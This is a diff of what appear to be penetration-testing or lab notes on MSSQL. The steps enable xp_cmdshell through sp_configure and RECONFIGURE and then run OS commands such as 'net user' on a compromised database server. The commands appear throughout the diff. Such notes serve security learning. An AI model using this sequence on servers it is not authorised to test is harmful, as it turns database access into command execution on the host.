@@ -24,7 +24,7 @@ If it returns 1, it is True and the user can run cmd commands.
 
 ### Command execution via xp\_cmdshell()
 
-Once we have access to the SQL database we can check if we can use the command using:
+Once we have access to the SQL database we can check if we can use the xp\_cmdshell() command using:
 
 ```sql
  EXEC xp_cmdshell 'net user';
@@ -38,17 +38,15 @@ If we get the following result, we don't have access to the command and we need 
 ```
 {% endcode %}
 
-**Reconfiguration steps**
-
-* If sp\_configure command is set to show advanced options we can just use that to view the configuration settings using:
+Alternatively you can check it using the following query/command.
 
 ```
 sp_configure;
 ```
 
-* It would look something like this:
+It would give an output like the one shown below. Here you can find the configuration values of other options/commands as well.
 
-{% code fullWidth="true" %}
+{% code fullWidth="false" %}
 ```
 name                                      minimum       maximum   config_value     run_value   
 
@@ -206,27 +204,34 @@ xp_cmdshell                                     0             1              0  
 ```
 {% endcode %}
 
+**Reconfiguration steps**
 
+1. If sp\_configure command is set to show advanced options we can just directly set the xp\_cmdshell option (aka directly skip to step 5). The best way to know this is to run the command in step 5.
+2. If we get the error shown below:
 
-* Set the show advanced options to TRUE.&#x20;
+```awk
+[-] ERROR(ARCHETYPE): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+```
+
+&#x20;      Then we have to set the show advanced options to TRUE by using the command: &#x20;
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
 ```
 
-* Reconfigure using the RECONFIGURE command.
+3. Reconfigure using the RECONFIGURE command.
 
 ```sql
 RECONFIGURE;
 ```
 
-* Check if sp\_configure is working with advanced options
+4. Check if sp\_configure is working with advanced options
 
 ```
 sp_configure;
 ```
 
-* Allow xp\_cmdshell using the command:
+5. Allow xp\_cmdshell using the command:
 
 ```sql
 EXEC sp_configure 'xp_cmdshell', 1;
